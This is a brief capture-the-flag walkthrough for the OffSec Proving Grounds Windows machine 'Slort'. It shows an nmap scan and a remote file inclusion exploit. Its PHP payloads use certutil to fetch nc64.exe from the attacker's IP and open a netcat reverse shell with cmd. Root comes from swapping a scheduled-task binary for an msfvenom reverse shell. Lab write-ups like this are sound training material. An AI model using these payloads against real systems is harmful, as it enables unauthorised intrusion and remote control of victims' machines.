# Slort

## Info

Slort is an intermediate windows machine from offsec proving grounds.

## Nmap

All ports tcp scan.

```
21/tcp    open  ftp           syn-ack ttl 125 FileZilla ftpd 0.9.41 beta
135/tcp   open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 125 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack ttl 125
3306/tcp  open  mysql?        syn-ack ttl 125
4443/tcp  open  http          syn-ack ttl 125 Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
5040/tcp  open  unknown       syn-ack ttl 125
7680/tcp  open  pando-pub?    syn-ack ttl 125
8080/tcp  open  http          syn-ack ttl 125 Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
49664/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
```

## HTTP 4443

The following url has a rfi vulnerability and executes php code.

```
http://192.168.209.53:4443/site/index.php?page=http://192.168.45.180/test.php
```

Uploading nc onto the machine.

```
<?php

system("certutil -urlcache -split -f http://192.168.45.180/nc64.exe C:\\xampp\\htdocs\\site\\nc64.exe");

?>
```

Executing nc.

```
<?php

system("nc64.exe 192.168.45.180 8080 -e cmd");

?>
```

## Root

There is a task running in C:\backup.

Create an executable with msfvenom called TFTP.EXE, remove the old one and upload the new reverse shell.

Wait a couple of minutes until the shell arrives.
